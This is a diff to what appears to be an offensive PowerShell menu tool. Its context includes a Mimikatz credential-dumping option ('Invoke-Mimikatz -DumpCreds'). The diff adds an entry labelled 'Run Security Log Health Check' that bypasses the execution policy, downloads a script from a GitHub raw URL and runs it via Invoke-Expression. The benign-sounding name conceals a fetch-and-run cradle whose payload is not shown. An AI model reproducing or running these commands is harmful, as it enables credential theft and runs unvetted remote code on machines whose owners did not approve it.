@@ -103,15 +103,28 @@ function global:prompt { "PCT> " };
             Invoke-Mimikatz -DumpCreds
         }
     }
+
     4 = @{
+        Name    = "Run Security Log Health Check"
+        Command = {
+            Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
+            [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
+            $script = (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/IAMinZoho/Girism/refs/heads/main/Start-SecurityLogHealthCheck.ps1')
+            Invoke-Expression $script
+        }
+    }
+
+    5 = @{
         Name    = "Check Disk Space"
         Command = { Get-Disk }
     }
-    5 = @{
+  
+    6 = @{
         Name    = "Show Obfuscation Info"
         Command = $null
     }
-    6 = @{
+  
+    7 = @{
         Name    = "Exit"
         Command = $null
     }
